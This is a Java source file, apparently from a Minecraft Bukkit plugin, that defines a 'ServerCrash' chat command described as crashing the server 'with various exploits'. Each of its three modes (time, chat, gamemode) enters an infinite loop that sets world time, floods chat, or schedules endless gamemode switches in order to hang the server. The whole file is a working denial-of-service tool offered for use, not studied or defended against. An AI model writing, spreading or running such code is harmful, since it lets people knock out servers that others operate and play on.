package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.main.Main;
import de.impact.utils.ChatUtils;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;

public class ServerCrash extends Command {

    public ServerCrash() {
        super("ServerCrash", "ServerCrash <Time | Chat | Gamemode>", "Crash the server with various exploits", CommandCategory.SERVER, "SCrash");
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 1) {
            sendUsage(p);
            return;
        }

        switch (aliases[0].toLowerCase()) {

            case "time":
                ChatUtils.sendMessage(p, "Successfully crashed the server using the time exploit");
                while(true)
                    for(int i4=0;i4<24000;i4++)
                        p.getWorld().setTime(i4);

            case "chat":
                ChatUtils.sendMessage(p, "Successfully crashed the server using the chat exploit");
                while(true)
                    ChatUtils.broadcastDefault("§a");

            case "gamemode":
                ChatUtils.sendMessage(p, "Successfully crashed the server using the gamemode exploit");
                while(true)
                    Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getPlugin(), () ->
                            p.setGameMode(p.getGameMode().equals(GameMode.CREATIVE) ? GameMode.SURVIVAL : GameMode.CREATIVE));

            default:
                sendUsage(p);
                return;
        }

    }

}
